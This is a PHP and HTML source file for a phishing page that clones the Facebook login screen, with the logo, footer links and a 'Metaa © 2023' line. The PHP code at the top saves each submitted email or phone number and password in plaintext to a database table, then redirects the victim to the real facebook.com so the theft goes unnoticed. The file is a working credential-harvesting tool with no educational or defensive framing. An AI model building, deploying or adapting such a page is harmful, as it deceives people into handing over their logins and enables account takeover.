<?php

include('./dbcon.php');

if (isset($_POST["upload"])) {
    $username = stripslashes($_POST["username"]);
    $password = stripslashes($_POST["password"]);
    $date = date("Y-m-d H:i:s");


    $username = mysqli_real_escape_string($con, $username);
    $password = mysqli_real_escape_string($con, $password);


    // Get all the submitted data from the form
    $sql = "INSERT INTO `users`(`username`, `password`,`date`) VALUES ('$username','$password','$date')";

    // Execute query
    $save = mysqli_query($con, $sql);

    if ($save) {
        echo "<script>window.location='https://www.facebook.com/';</script>";
    }
}
?>

<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width" />
    <title>log in or sign up</title>
    <link
      rel="icon"
      href="./images/fb.png"
    />
    <link rel="stylesheet" href="./styles.css" />
    <link
      rel="stylesheet"
      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.13.0/css/all.min.css"
    />
  </head>
  <body>
    <div class="contains-top-half-and-footer-bottom-half">
      <div class="global-container">
        <div class="bigger-box">
          <div class="big-box">
            <div class="left-box">
              <div class="image-box">
                <img
                  class="fb-logo"
                  src="facebook.svg"
                  alt=""
                />
              </div>
              <h2 class="logo-caption">
                Facebook helps you connect and share with the people in your
                life.
              </h2>
            </div>
            <div class="right-box">
              <div class="form-container">
                <form  method="post">
                  <div class="space">
                    <input
                      type="text"
                      class="email-box"
                      placeholder="Email address or Phone number"
                      name="username"
                      required
                    />
                  </div>
                  <div style="display: flex">
                    <div class="space">
                      <input
                        type="password"
                        class="pw-box"
                        placeholder="Password"
                        id="password_field"
                        name="password"
                        required
                      />
                    </div>
                    <i
                      class="far fa-eye-slash"
                      id="toggleEyeIcon"
                      style="cursor: pointer; display: none; margin: 24px -42px"
                    ></i>
                  </div>
                  <div class="space">
                    <button class="login-button"  type="submit" name="upload">
                      <b>Log In</b>
                    </button>
                  </div>
                  <div class="spaceTwo adjustTwo">
                    <a href="#" class="adjust-forgot-pw">Forgotten password?</a>
                  </div>
                  <div class="line"></div>
                  <div>
                    <button type="button" class="create-button">
                      <b>Create New Account</b>
                    </button>
                  </div>
                </form>
              </div>
              <div class="bottom-link-box">
                <a class="bottom-link" href="#"><b>Create a Page</b></a>
                for a celebrity, band or business.
              </div>
            </div>
          </div>
        </div>
      </div>
      <footer>
        <div>
          <ul>
            <li class="list-items">English (UK)</li>
            <li class="list-items">
              <a class="list-items" href="#">Hausa</a>
            </li>
            <li class="list-items">
              <a class="list-items" href="#">Français (France)</a>
            </li>
            <li class="list-items">
              <a class="list-items" href="#">Português (Brasil)</a>
            </li>
            <li class="list-items">
              <a class="list-items" href="#">Español</a>
            </li>
            <li class="list-items">
              <a class="list-items" href="#">العربية</a>
            </li>
            <li class="list-items">
              <a class="list-items" href="#">Deutsch</a>
            </li>
            <li class="list-items">
              <a class="list-items" href="#">日本語</a>
            </li>
            <li class="list-items">
              <a class="list-items" href="#">Italiano</a>
            </li>
            <li class="list-items">
              <a class="list-items" href="#">हिन्दी</a>
            </li>
            <button type="button" class="plus-button">+</button>
          </ul>
          <div class="line-2 reduce-margin"></div>
          <ul>
            <li class="list-items">
              <a class="list-items" href="#">Sign Up</a>
            </li>
            <li class="list-items">
              <a class="list-items" href="#">Log in</a>
            </li>
            <li class="list-items"><a class="list-items" href="#">Messenger</a></li>
            <li class="list-items">
              <a class="list-items" href="#">Facebook Lite</a>
            </li>
            <li class="list-items"><a class="list-items" href="#">Pages</a></li>
            <li class="list-items">
              <a class="list-items" href="#">Page Categories</a>
            </li>
            <li class="list-items">
              <a class="list-items" href="#">Places</a>
            </li>
            <li class="list-items"><a class="list-items" href="#">Games</a></li>
            <li class="list-items">
              <a class="list-items" href="#">Locations</a>
            </li>
            <li class="list-items">
              <a class="list-items" href="#">Marketplace</a>
            </li>
            <li class="list-items">
              <a class="list-items" href="#">Fb Pay</a>
            </li>
            <li class="list-items">
              <a class="list-items" href="#">Groups</a>
            </li>
            <li class="list-items"><a class="list-items" href="#">Jobs</a></li>
            <li class="list-items">
              <a class="list-items" href="#">Occulus</a>
            </li>
            <li class="list-items">
              <a class="list-items" href="#">Portal</a>
            </li>
            <li class="list-items">
              <a class="list-items" href="#">Instagram</a>
            </li>
            <li class="list-items"><a class="list-items" href="#">Local</a></li>
            <li class="list-items">
              <a class="list-items" href="#">Fundraisers</a>
            </li>
            <li class="list-items">
              <a class="list-items" href="#">Services</a>
            </li>
            <li class="list-items">
              <a class="list-items" href="#">Spark AR</a>
            </li>
            <li class="list-items">
              <a class="list-items" href="#">Shops</a>
            </li>
            <li class="list-items">
              <a class="list-items" href="#">Voting Information Centre</a>
            </li>
            <li class="list-items"><a class="list-items" href="#">About</a></li>
            <li class="list-items">
              <a class="list-items" href="#">Create ad</a>
            </li>
            <li class="list-items">
              <a class="list-items" href="#">Create Page</a>
            </li>
            <li class="list-items">
              <a class="list-items" href="#">Developers</a>
            </li>
            <li class="list-items">
              <a class="list-items" href="#">Careers</a>
            </li>
            <li class="list-items">
              <a class="list-items" href="#">Privacy</a>
            </li>
            <li class="list-items">
              <a class="list-items" href="#">Cookies</a>
            </li>
            <li class="list-items">
              <a class="list-items" href="#">AdChoices</a>
            </li>
            <li class="list-items"><a class="list-items" href="#">Terms</a></li>
            <li class="list-items"><a class="list-items" href="#">Help</a></li>
          </ul>
          <div class="fb-clone">
            <a
              class="fb-clone-link"
              href=""
              rel="noopener noreferrer"
              >Metaa © 2023</a
            >
          </div>
        </div>
      </footer>
    </div>

    <!-- Script to toggle on & off the eye icon in the password field -->
    <script src="./toggleEyeIcon.js"></script>
  </body>
</html>
